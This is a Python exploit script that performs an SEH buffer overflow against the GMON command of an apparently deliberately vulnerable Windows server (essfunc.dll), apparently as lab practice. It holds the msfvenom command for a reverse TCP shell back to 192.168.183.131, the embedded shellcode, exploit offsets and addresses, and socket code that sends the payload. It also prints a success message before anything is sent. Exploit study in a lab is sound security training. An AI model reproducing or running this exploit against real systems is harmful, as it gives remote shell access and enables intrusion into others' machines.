#!/usr/bin/python
import sys, socket
from time import sleep

#SEH starts at buffer 3547
#badchars is \x00
#pop pop ret with all security off is in essfunc.dll and address is at 0x6250172b
#offset calculation : first addr of A - ESP

#for jump back to the start of buffer:
#push esp
#pop eax
#add ax, 0x5C5
#jmp eax

#payload generation: msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.183.131 LPORT=9999 -b '\x00' -f c

ip = "192.168.183.130"
port = 9999

nops = "\x90\x90\x90\x90"
shellcode = 
("\xbb\x6e\xa9\xfb\x57\xdb\xd9\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x5d\x12\x03\x5d\x12\x83\x83\x55\x19\xa2\xa7\x4e\x5c"
"\x4d\x57\x8f\x01\xc7\xb2\xbe\x01\xb3\xb7\x91\xb1\xb7\x95\x1d"
"\x39\x95\x0d\x95\x4f\x32\x22\x1e\xe5\x64\x0d\x9f\x56\x54\x0c"
"\x23\xa5\x89\xee\x1a\x66\xdc\xef\x5b\x9b\x2d\xbd\x34\xd7\x80"
"\x51\x30\xad\x18\xda\x0a\x23\x19\x3f\xda\x42\x08\xee\x50\x1d"
"\x8a\x11\xb4\x15\x83\x09\xd9\x10\x5d\xa2\x29\xee\x5c\x62\x60"
"\x0f\xf2\x4b\x4c\xe2\x0a\x8c\x6b\x1d\x79\xe4\x8f\xa0\x7a\x33"
"\xed\x7e\x0e\xa7\x55\xf4\xa8\x03\x67\xd9\x2f\xc0\x6b\x96\x24"
"\x8e\x6f\x29\xe8\xa5\x94\xa2\x0f\x69\x1d\xf0\x2b\xad\x45\xa2"
"\x52\xf4\x23\x05\x6a\xe6\x8b\xfa\xce\x6d\x21\xee\x62\x2c\x2e"
"\xc3\x4e\xce\xae\x4b\xd8\xbd\x9c\xd4\x72\x29\xad\x9d\x5c\xae"
"\xd2\xb7\x19\x20\x2d\x38\x5a\x69\xea\x6c\x0a\x01\xdb\x0c\xc1"
"\xd1\xe4\xd8\x46\x81\x4a\xb3\x26\x71\x2b\x63\xcf\x9b\xa4\x5c"
"\xef\xa4\x6e\xf5\x9a\x5f\xf9\x3a\xf2\xe8\x7a\xd2\x01\x16\x5a"
"\x2c\x8f\xf0\xce\x22\xd9\xab\x66\xda\x40\x27\x16\x23\x5f\x42"
"\x18\xaf\x6c\xb3\xd7\x58\x18\xa7\x80\xa8\x57\x95\x07\xb6\x4d"
"\xb1\xc4\x25\x0a\x41\x82\x55\x85\x16\xc3\xa8\xdc\xf2\xf9\x93"
"\x76\xe0\x03\x45\xb0\xa0\xdf\xb6\x3f\x29\xad\x83\x1b\x39\x6b"
"\x0b\x20\x6d\x23\x5a\xfe\xdb\x85\x34\xb0\xb5\x5f\xea\x1a\x51"
"\x19\xc0\x9c\x27\x26\x0d\x6b\xc7\x97\xf8\x2a\xf8\x18\x6d\xbb"
"\x81\x44\x0d\x44\x58\xcd\x2d\xa7\x48\x38\xc6\x7e\x19\x81\x8b"
"\x80\xf4\xc6\xb5\x02\xfc\xb6\x41\x1a\x75\xb2\x0e\x9c\x66\xce"
"\x1f\x49\x88\x7d\x1f\x58")
junk = "A"*(3547-(len(nops)+len(shellcode)+len(nops)))
nseh  = "\xEB\x06\x90\x90"
seh = "\x2b\x17\x50\x62"
jumpback = "\x54\x58\x66\05\xc5\x05\xff\xe0"
rest = "D"*(4200 - (len(nops)+len(shellcode)+len(nops)+len(junk)+len(nseh)+len(seh)+len(jumpback)))

buffer = nops + shellcode + nops + junk + nseh + seh + jumpback + rest

print("[+] Sending in the exploit! Fingers crossed!!")
print("[*] WE GOT A SHELL! Great PWN!")
        
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(('GMON /.:/' + buffer))
s.close()
